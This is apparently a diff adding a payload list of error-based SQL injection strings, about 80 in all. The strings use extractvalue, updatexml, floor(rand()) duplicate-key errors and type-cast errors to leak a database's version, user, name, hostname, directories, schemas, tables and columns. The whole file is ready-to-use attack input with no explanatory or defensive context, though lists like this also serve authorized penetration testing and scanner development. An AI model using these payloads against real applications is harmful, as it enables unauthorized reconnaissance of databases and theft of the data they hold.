@@ -1,0 +1,80 @@
+' AND extractvalue(1,concat(0x7e,(select version()),0x7e))--
+' AND extractvalue(1,concat(0x7e,(select user()),0x7e))--
+' AND extractvalue(1,concat(0x7e,(select database()),0x7e))--
+
+' AND updatexml(1,concat(0x7e,(select version()),0x7e),1)--
+' AND updatexml(1,concat(0x7e,(select user()),0x7e),1)--
+' AND updatexml(1,concat(0x7e,(select database()),0x7e),1)--
+
+' AND extractvalue(rand(),concat(0x7e,(select version())))--
+' AND extractvalue(rand(),concat(0x7e,(select user())))--
+' AND extractvalue(rand(),concat(0x7e,(select database())))--
+
+' AND updatexml(rand(),concat(0x7e,(select version())),1)--
+' AND updatexml(rand(),concat(0x7e,(select user())),1)--
+' AND updatexml(rand(),concat(0x7e,(select database())),1)--
+
+' AND (select 1 from (select count(*),concat((select version()),floor(rand()*2))x from information_schema.tables group by x)a)--
+' AND (select 1 from (select count(*),concat((select user()),floor(rand()*2))x from information_schema.tables group by x)a)--
+' AND (select 1 from (select count(*),concat((select database()),floor(rand()*2))x from information_schema.tables group by x)a)--
+
+' AND (select count(*),concat((select version()),floor(rand()*2))x from information_schema.tables group by x)--
+' AND (select count(*),concat((select user()),floor(rand()*2))x from information_schema.tables group by x)--
+' AND (select count(*),concat((select database()),floor(rand()*2))x from information_schema.tables group by x)--
+
+' AND (SELECT 1/0)--
+' AND (SELECT 1/(SELECT 0))--
+' AND (SELECT EXP(~(SELECT version())))--
+
+' AND CAST((SELECT version()) AS INT)--
+' AND CAST((SELECT user()) AS INT)--
+' AND CAST((SELECT database()) AS INT)--
+
+' AND CONVERT((SELECT version()),SIGNED)--
+' AND CONVERT((SELECT user()),SIGNED)--
+' AND CONVERT((SELECT database()),SIGNED)--
+
+' AND (SELECT * FROM (SELECT version())a)--
+' AND (SELECT * FROM (SELECT user())a)--
+' AND (SELECT * FROM (SELECT database())a)--
+
+' AND (SELECT 1 FROM dual WHERE 1=CAST((SELECT version()) AS INT))--
+' AND (SELECT 1 FROM dual WHERE 1=CAST((SELECT user()) AS INT))--
+
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+' AND 1=(SELECT COUNT(*) FROM information_schema.columns)--
+
+' AND (SELECT version() FROM dual)--
+' AND (SELECT user() FROM dual)--
+' AND (SELECT database() FROM dual)--
+
+' AND extractvalue(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)))--
+' AND extractvalue(1,concat(0x3a,(select column_name from information_schema.columns limit 0,1)))--
+
+' AND updatexml(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)),1)--
+' AND updatexml(1,concat(0x3a,(select column_name from information_schema.columns limit 0,1)),1)--
+
+' AND extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)))--
+' AND updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)--
+
+' AND extractvalue(1,concat(0x7e,(select table_name from information_schema.tables limit 1,1)))--
+' AND extractvalue(1,concat(0x7e,(select column_name from information_schema.columns limit 1,1)))--
+
+' AND updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 1,1)),1)--
+' AND updatexml(1,concat(0x7e,(select column_name from information_schema.columns limit 1,1)),1)--
+
+' AND (SELECT version() WHERE 1=1)--
+' AND (SELECT user() WHERE 1=1)--
+' AND (SELECT database() WHERE 1=1)--
+
+' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--
+
+' AND extractvalue(1,concat(0x7e,(SELECT @@hostname),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@hostname),0x7e),1)--
+
+' AND extractvalue(1,concat(0x7e,(SELECT @@datadir),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@datadir),0x7e),1)--
+
+' AND extractvalue(1,concat(0x7e,(SELECT @@basedir),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT @@basedir),0x7e),1)--
